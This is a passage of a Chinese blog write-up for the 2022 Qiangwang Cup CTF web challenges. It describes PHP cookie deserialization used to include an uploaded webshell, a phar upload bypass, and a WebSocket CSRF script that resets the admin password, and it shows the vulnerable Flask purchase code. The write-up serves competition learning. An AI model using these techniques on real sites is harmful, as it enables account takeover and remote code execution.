@@ -1,0 +1,2325 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip'>
+<title>[2022强网杯] WP</title>
+
+<link rel='canonical' href='https://example.com/post/qwb2022/'>
+
+<link rel="stylesheet" href="/scss/style.min.a50aba51166dc5bc1c208df7b60653be38aa0ed7b643534462b6f2a9afb0a257.css"><meta property='og:title' content='[2022强网杯] WP'>
+<meta property='og:description' content='rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip'>
+<meta property='og:url' content='https://example.com/post/qwb2022/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-07-31T20:35:47&#43;08:00'/><meta property='article:modified_time' content='2022-07-31T20:35:47&#43;08:00'/>
+<meta name="twitter:title" content="[2022强网杯] WP">
+<meta name="twitter:description" content="rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#rcefile">rcefile</a>
+      <ol>
+        <li><a href="#预期解">预期解</a></li>
+        <li><a href="#非预期解">非预期解</a></li>
+      </ol>
+    </li>
+    <li><a href="#babyweb">babyweb</a>
+      <ol>
+        <li><a href="#go的整数溢出">go的整数溢出</a></li>
+        <li><a href="#json处理不同">json处理不同</a></li>
+      </ol>
+    </li>
+    <li><a href="#easyweb">easyweb</a></li>
+    <li><a href="#crash">crash</a>
+      <ol>
+        <li><a href="#非预期">非预期</a></li>
+        <li><a href="#预期">预期</a></li>
+      </ol>
+    </li>
+    <li><a href="#wp-um">WP-UM</a></li>
+    <li><a href="#easylogin">easylogin</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #fc2828; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/qwb2022/">[2022强网杯] WP</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 31, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="rcefile">rcefile</h1>
+<h2 id="预期解">预期解</h2>
+<p>原题改的：https://cloud.tencent.com/developer/article/1717668</p>
+<p>首先是www.zip源码泄露</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220731203952360.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220731203952360"
+	
+	
+></p>
+<p>先看config.inc.php这里有<code>spl_autoload_register()</code>，这个函数是会加载inc文件的</p>
+<p>这里会检测cookie，如果有userfile的话，会进行反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">spl_autoload_register</span><span class="p">();</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+    <span class="k">return</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$userfile</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;userfile&#34;</span><span class="p">])</span> <span class="o">?</span> <span class="p">[]</span> <span class="o">:</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;userfile&#34;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;p&gt;
+</span><span class="err">    &lt;a href=&#34;/index.php&#34;&gt;Index&lt;/a&gt;
+</span><span class="err">    &lt;a href=&#34;/showfile.php&#34;&gt;files&lt;/a&gt;
+</span><span class="err">&lt;/p&gt;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>这里有文件上传的功能，我们可以上传一个inc文件里面是一句话木马，这里我们把文件名放进cookie里面构造一个序列化数据即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802140604182.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802140604182"
+	
+	
+></p>
+<p>把cookie替换，成功通过spl_autoload_register()包含</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802140645488.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802140645488"
+	
+	
+></p>
+<h2 id="非预期解">非预期解</h2>
+<p>直接上传phar文件，发现是可以解析的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802140746474.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802140746474"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802140756981.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802140756981"
+	
+	
+></p>
+<h1 id="babyweb">babyweb</h1>
+<p>目录扫描到下面结果</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802140954044.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802140954044"
+	
+	
+></p>
+<p>扫到一个buy，测试一下需要post发包，然后需要admin</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802141024717.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802141024717"
+	
+	
+></p>
+<p>看起来是需要拿到admin的权限，然后去这里发包拿flag</p>
+<p>进去里面发现有个修改密码的功能点，还有个报告bug的功能点，这组合起来就是一个csrf的利用了</p>
+<p>这里修改密码是要ws发包过去的，我直接对着题目的js做了一点修改然后放到服务器</p>
+<p>一开始一直没成功，后来发现可能得用内网的地址，刚好题目给了docker部署的命令，所以知道端口是8888</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802144443674.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802144443674"
+	
+	
+></p>
+<p>构造如下的csrf脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+    <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:8888&#34;</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;ws://&#34;</span> <span class="o">+</span> <span class="nx">host</span> <span class="o">+</span> <span class="s2">&#34;/bot&#34;</span><span class="p">;</span>
+
+    <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+    <span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;connection open!&#39;</span><span class="p">)</span>
+        <span class="kd">var</span> <span class="nx">msg</span> <span class="o">=</span> <span class="s2">&#34;changepw 123&#34;</span><span class="p">;</span>
+        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;changepw&#39;</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">ev</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">botsay</span><span class="p">(</span><span class="nx">ev</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+    <span class="p">};</span>
+    <span class="nx">ws</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;connection error&#34;</span><span class="p">);</span>
+    <span class="p">};</span>
+    <span class="nx">ws</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;connection close!&#34;</span><span class="p">);</span>
+    <span class="p">};</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>修改密码进入后，发现有个购买界面，这里的钱只够购买hint，下载到是源码</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220802144545699.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20220802144545699"
+	
+	
+><a class="link" href="http://app.py"  target="_blank" rel="noopener"
+    >app.py</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/buy&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">buy</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&#34;you are not admin&#34;</span>
+    <span class="k">else</span> <span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+        <span class="n">product</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;product&#34;</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">:</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">],</span><span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s2">&#34;num&#34;</span><span class="p">],</span><span class="nb">int</span><span class="p">):</span>
+                <span class="k">return</span> <span class="s2">&#34;not int&#34;</span>
+            <span class="k">if</span> <span class="n">i</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
+                <span class="k">return</span> <span class="s2">&#34;id error&#34;</span>
+            <span class="k">if</span> <span class="n">i</span><span class="p">[</span><span class="s2">&#34;num&#34;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+                <span class="k">return</span> <span class="s2">&#34;num error&#34;</span>
+            <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]]</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="s2">&#34;num&#34;</span><span class="p">]</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select money,flag,hint from qwb where username=&#39;admin&#39;&#34;</span>
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;/root/py/test.db&#39;</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">cursor</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
+                <span class="n">money</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="n">hint</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;{&#34;secret&#34;:&#34;xxxx&#34;,&#34;money&#34;:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">money</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;,&#39;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()[</span><span class="mi">1</span><span class="p">:]</span> <span class="c1">#secret已打码</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;&lt;http://127.0.0.1:10002/pay&gt;&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]</span>
+        <span class="n">money</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s2">&#34;money&#34;</span><span class="p">])</span>
+        <span class="n">hint</span> <span class="o">=</span> <span class="n">hint</span> <span class="o">+</span> <span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">result</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;update qwb set money=</span><span class="si">{}</span><span class="s2">,hint=</span><span class="si">{}</span><span class="s2">,flag=</span><span class="si">{}</span><span class="s2"> where username=&#39;admin&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">money</span><span class="p">,</span><span class="n">hint</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;/root/py/test.db&#39;</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">rollback</span><span class="p">()</span>
+            <span class="n">c</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="s2">&#34;database error&#34;</span>
+        <span class="k">return</span> <span class="s2">&#34;success&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>pay.go</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
